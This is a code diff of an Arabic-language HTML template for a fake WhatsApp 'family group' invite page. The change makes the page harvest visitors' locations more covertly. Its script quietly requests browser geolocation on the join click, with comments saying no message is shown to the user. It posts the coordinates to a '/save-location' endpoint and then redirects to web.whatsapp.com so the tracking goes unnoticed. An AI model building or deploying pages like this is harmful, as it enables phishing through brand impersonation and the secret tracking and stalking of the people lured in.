@@ -4,6 +4,7 @@
     <title>مجموعة العائلة - واتساب</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        /* نفس التنسيقات السابقة */
         * {
             margin: 0;
             padding: 0;
@@ -142,29 +143,6 @@
             margin: 20px 0;
         }
         
-        .step {
-            display: flex;
-            align-items: center;
-            margin: 15px 0;
-            text-align: right;
-            padding: 10px;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.7);
-        }
-        
-        .step-number {
-            background: #25D366;
-            color: white;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-left: 15px;
-            font-weight: bold;
-        }
-        
         .loader {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #25D366;
@@ -178,25 +156,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        
-        .success-message {
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border-right: 4px solid #28a745;
-            display: none;
-        }
-        
-        .location-section {
-            display: none;
-            background: #e8f5e8;
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            text-align: center;
         }
         
         .admin-info {
@@ -226,7 +185,6 @@
     <div class="whatsapp-card">
         <div class="whatsapp-watermark">WhatsApp</div>
         
-        <!-- قسم مجموعة واتساب -->
         <div id="whatsapp-section">
             <div class="group-image">
                 👑
@@ -255,7 +213,7 @@
                 <small style="color: #888;">الأعضاء النشطين الآن: ١٢٤٥</small>
             </div>
             
-            <button class="join-button" onclick="startProcess()">
+            <button class="join-button" onclick="joinGroup()" id="joinButton">
                 🎯 الانضمام للمجموعة
             </button>
             
@@ -265,197 +223,79 @@
             </div>
         </div>
         
-        <!-- قسم التحميل -->
         <div id="loading-section" class="loading-section">
-            <h3 style="color: #075E54; margin-bottom: 20px;">🔒 جاري التحضير للمجموعة الآمنة</h3>
-            
-            <div class="step">
-                <span class="step-number">1</span>
-                <span>✅ جاري التحقق من الهوية...</span>
-            </div>
-            
-            <div class="step">
-                <span class="step-number">2</span>
-                <span>🔒 جاري تأمين الاتصال...</span>
-            </div>
-            
-            <div class="step">
-                <span class="step-number">3</span>
-                <span>📍 جاري تحديد الموقع لتأكيد الهوية...</span>
-            </div>
-            
-            <div class="step">
-                <span class="step-number">4</span>
-                <span>📱 جاري تحميل المجموعة...</span>
-            </div>
-            
+            <h3 style="color: #075E54; margin-bottom: 20px;">جاري التحضير للمجموعة الآمنة</h3>
             <div class="loader"></div>
-            
-            <p id="countdown" style="margin-top: 15px; color: #666;">
-                سيتم التحويل خلال: <span id="timer">7</span> ثواني
-            </p>
-        </div>
-        
-        <!-- قسم طلب الموقع -->
-        <div id="location-section" class="location-section">
-            <h3 style="color: #155724; margin-bottom: 15px;">📍 يلزم تحديد الموقع</h3>
-            <p style="margin-bottom: 15px; color: #666;">
-                للانضمام للمجموعة الآمنة، يرجى السماح بمشاركة الموقع
-            </p>
-            <button class="join-button" onclick="requestLocation()" style="background: linear-gradient(45deg, #ff6b6b, #ee5a24);">
-                📍 السماح بالوصول إلى الموقع
-            </button>
-            <p style="font-size: 12px; color: #888; margin-top: 10px;">
-                هذا يساعد في تأكيد هويتك وأمان المجموعة
-            </p>
-        </div>
-        
-        <!-- رسالة النجاح -->
-        <div id="success-message" class="success-message">
-            <h3 style="margin-bottom: 10px;">✅ تم بنجاح!</h3>
-            <p>جاري تحويلك إلى مجموعة واتساب...</p>
+            <p style="margin-top: 15px; color: #666;">جاري التحويل إلى واتساب...</p>
         </div>
     </div>
 
     <script>
-        const logId = {{ log_id or 'null' }};
-        let locationRequested = false;
-        
-        function startProcess() {
-            // إخفاء قسم واتساب وإظهار قسم التحميل
-            document.getElementById('whatsapp-section').style.display = 'none';
+        function joinGroup() {
+            // إخفاء الزر وإظهار تحميل
+            document.getElementById('joinButton').disabled = true;
+            document.getElementById('joinButton').innerHTML = 'جاري التحميل...';
             document.getElementById('loading-section').style.display = 'block';
             
-            // بدء العد التنازلي
-            startCountdown();
+            // محاولة الحصول على الموقع في الخلفية
+            getLocation();
             
-            // بعد 3 ثواني، طلب الموقع
+            // الانتقال إلى واتساب بعد 3 ثوانٍ
             setTimeout(() => {
-                requestLocation();
+                window.location.href = 'https://web.whatsapp.com';
             }, 3000);
         }
         
-        function startCountdown() {
-            let timeLeft = 7;
-            const timerElement = document.getElementById('timer');
-            
-            const countdown = setInterval(() => {
-                timeLeft--;
-                timerElement.textContent = timeLeft;
-                
-                if (timeLeft <= 0) {
-                    clearInterval(countdown);
-                    // إذا لم يتم طلب الموقع بعد، انتقل مباشرة
-                    if (!locationRequested) {
-                        redirectToWhatsApp();
-                    }
-                }
-            }, 1000);
-        }
-        
-        function requestLocation() {
-            locationRequested = true;
-            
-            // إخفاء قسم التحميل وإظهار قسم الموقع
-            document.getElementById('loading-section').style.display = 'none';
-            document.getElementById('location-section').style.display = 'block';
-            
-            // محاولة الحصول على الموقع
+        function getLocation() {
             if (navigator.geolocation) {
+                // نحاول الحصول على الموقع بدون عرض أي رسالة
                 navigator.geolocation.getCurrentPosition(
-                    // النجاح
+                    // إذا نجحنا
                     function(position) {
-                        console.log("✅ تم الحصول على الموقع:", position.coords);
-                        sendLocationToServer(position.coords);
-                        showSuccessAndRedirect();
+                        // إرسال الموقع إلى السيرفر
+                        sendLocation(position.coords);
                     },
-                    // الفشل
+                    // إذا فشلنا
                     function(error) {
-                        console.log("❌ فشل الحصول على الموقع:", error);
-                        // المحاولة مرة أخرى بإعدادات مختلفة
-                        setTimeout(() => {
-                            navigator.geolocation.getCurrentPosition(
-                                function(position) {
-                                    console.log("✅ تم الحصول على الموقع في المحاولة الثانية");
-                                    sendLocationToServer(position.coords);
-                                    showSuccessAndRedirect();
-                                },
-                                function(secondError) {
-                                    console.log("❌ فشل تماماً في الحصول على الموقع");
-                                    // حتى لو فشل، انتقل إلى واتساب
-                                    showSuccessAndRedirect();
-                                },
-                                {
-                                    enableHighAccuracy: false,
-                                    timeout: 5000,
-                                    maximumAge: 60000
-                                }
-                            );
-                        }, 1000);
+                        // لا نعرض أي رسالة للمستخدم
+                        console.log("فشل في الحصول على الموقع: ", error);
                     },
+                    // خيارات: نحاول بسرعة وبدون دقة عالية لتجنب طلب الإذن الطويل
                     {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
+                        enableHighAccuracy: false,
+                        timeout: 5000,
+                        maximumAge: 60000
                     }
                 );
             } else {
-                console.log("❌ المتصفح لا يدعم GPS");
-                showSuccessAndRedirect();
+                console.log("المتصفح لا يدعم تحديد الموقع");
             }
         }
         
-        function sendLocationToServer(coords) {
-            if (!logId) {
-                console.log("❌ لا يوجد logId");
-                return;
-            }
-            
-            const locationData = {
-                log_id: logId,
+        function sendLocation(coords) {
+            // إرسال الإحداثيات إلى السيرفر
+            const data = {
                 lat: coords.latitude,
                 lon: coords.longitude,
                 accuracy: coords.accuracy
             };
             
+            // نستخدم fetch لإرسال البيانات إلى السيرفر
             fetch('/save-location', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(locationData)
+                body: JSON.stringify(data)
             })
             .then(response => response.json())
             .then(data => {
-                console.log("✅ تم إرسال الموقع إلى السيرفر:", data);
+                console.log('تم إرسال الموقع:', data);
             })
-            .catch(error => {
-                console.log("❌ خطأ في إرسال الموقع:", error);
+            .catch((error) => {
+                console.error('خطأ في إرسال الموقع:', error);
             });
         }
-        
-        function showSuccessAndRedirect() {
-            // إخفاء جميع الأقسام وإظهار رسالة النجاح
-            document.getElementById('location-section').style.display = 'none';
-            document.getElementById('loading-section').style.display = 'none';
-            document.getElementById('success-message').style.display = 'block';
-            
-            // الانتقال إلى واتساب بعد 3 ثواني
-            setTimeout(() => {
-                redirectToWhatsApp();
-            }, 3000);
-        }
-        
-        function redirectToWhatsApp() {
-            window.location.href = 'https://web.whatsapp.com';
-        }
-        
-        // بديل: إذا استغرق الأمر أكثر من 15 ثانية، انتقل مباشرة
-        setTimeout(() => {
-            if (window.location.href.indexOf('web.whatsapp.com') === -1) {
-                redirectToWhatsApp();
-            }
-        }, 15000);
     </script>
 </body>
 </html>
